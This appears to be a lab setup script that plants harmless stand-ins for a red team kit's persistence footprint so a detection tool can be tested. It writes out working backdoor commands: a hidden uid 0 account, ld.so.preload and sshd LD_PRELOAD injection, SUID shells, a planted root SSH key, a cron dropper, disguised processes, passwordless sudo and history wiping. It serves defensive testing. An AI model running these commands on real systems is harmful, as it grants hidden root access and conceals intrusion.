#!/bin/bash
# Recreates the footprint of the 2026 CCDC/NCAE red team kit with harmless
# stand-ins so hunter can be tested. Nothing here phones home or grants
# remote access beyond the lab container itself.
set -u
say() { echo "[plant] $*"; }

say "nologin replaced by bash (deploy_nologin_fix)"
cp /usr/bin/bash /usr/sbin/nologin

say "/bin/false allowed as a login shell"
echo /bin/false >> /etc/shells

say "system account password set to the kit hash"
usermod -p '$6$rpcb1nd$QA2KGAfDu7N2UpXtyWAPOb84lRU/AMMH01LkdJYVGSxNzyMFNAfmz0YWuHm0dQ8jj0xPpJ955W4tLdJ3f6g2X.' bin

say "hidden uid 0 account"
echo 'r00t:x:0:0::/root:/bin/bash' >> /etc/passwd

say "NSS backdoor source"
sed -i 's/^passwd:.*/& cache/' /etc/nsswitch.conf

say "ld.so.preload (harmless real library standing in for libkalloc.so)"
cp "$(ls /usr/lib64/libz.so.1* | head -1)" /lib64/libkalloc.so
echo /lib64/libkalloc.so > /etc/ld.so.preload

say "SUID bash named ssh-keygen"
mkdir -p /usr/lib/openssh && cp /usr/bin/bash /usr/lib/openssh/ssh-keygen && chmod 4755 /usr/lib/openssh/ssh-keygen

say "SUID flip on a packaged GTFOBin"
chmod u+s /usr/bin/find

say "fake timestomped daemon + unit"
cp /usr/bin/sleep /usr/sbin/rt-tagd && touch -r /usr/bin/ls /usr/sbin/rt-tagd
cat > /usr/lib/systemd/system/rt-tagd.service <<UNIT
[Unit]
Description=Routing table tag daemon
[Service]
ExecStart=/usr/sbin/rt-tagd infinity
[Install]
WantedBy=multi-user.target
UNIT
mkdir -p /etc/systemd/system/multi-user.target.wants
ln -sf /usr/lib/systemd/system/rt-tagd.service /etc/systemd/system/multi-user.target.wants/rt-tagd.service
nohup /usr/sbin/rt-tagd infinity >/dev/null 2>&1 &

say "sshd drop-in injecting LD_PRELOAD"
mkdir -p /etc/systemd/system/sshd.service.d
printf '[Service]\nEnvironment=LD_PRELOAD=/usr/lib/libudev-cache.so.1\n' > /etc/systemd/system/sshd.service.d/zz-udev-cache.conf

say "AuthorizedKeysCommand master-key wrapper config"
printf 'AuthorizedKeysCommand /usr/sbin/sshd-session-cache\nAuthorizedKeysCommandUser root\n' > /etc/ssh/sshd_config.d/99-cache.conf
printf '#!/bin/sh\necho stand-in\n' > /usr/sbin/sshd-session-cache && chmod 755 /usr/sbin/sshd-session-cache

say "red team master public key in root's authorized_keys"
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDZxeOFfrGYDQojEvZFsx1QHZfDNtLU5d8KJNLfQas+/ updater@acme.anvil' >> /root/.ssh/authorized_keys

say "cron dropper from /tmp"
echo '*/5 * * * * root /tmp/.sysupd.bin install' > /etc/cron.d/sysupd
printf 'stand-in\n' > /tmp/.sysupd.bin

say "deleted-binary process"
# Rocky's sleep is a coreutils shebang stub, so run the real multicall ELF
cp /usr/bin/coreutils /tmp/.x && (nohup /tmp/.x --coreutils-prog=sleep infinity >/dev/null 2>&1 &) && sleep 0.5 && rm -f /tmp/.x

say "process disguised as a kernel thread"
(nohup bash -c "exec -a '[kworker/u8:1]' /usr/bin/coreutils --coreutils-prog=sleep infinity" >/dev/null 2>&1 &)

say "passwordless sudo for a numeric group"
mkdir -p /etc/sudoers.d && echo '%#100 ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/90-cloud

say "python startup hook"
SP=$(python3 -c 'import sysconfig; print(sysconfig.get_paths()["purelib"])') && mkdir -p "$SP" && echo 'import os' > "$SP/sitecustomize.py"

say "sshrc login trigger and history wipe"
echo 'logger session' > /etc/ssh/sshrc
ln -sf /dev/null /root/.bash_history

say "alias hijack"
echo "alias sudo='sudo -S'" >> /root/.bashrc

say "markers"
printf '24\n34\n' > /tmp/test
touch /etc/ssl/certs/.ca-bundle.lock

say "done"
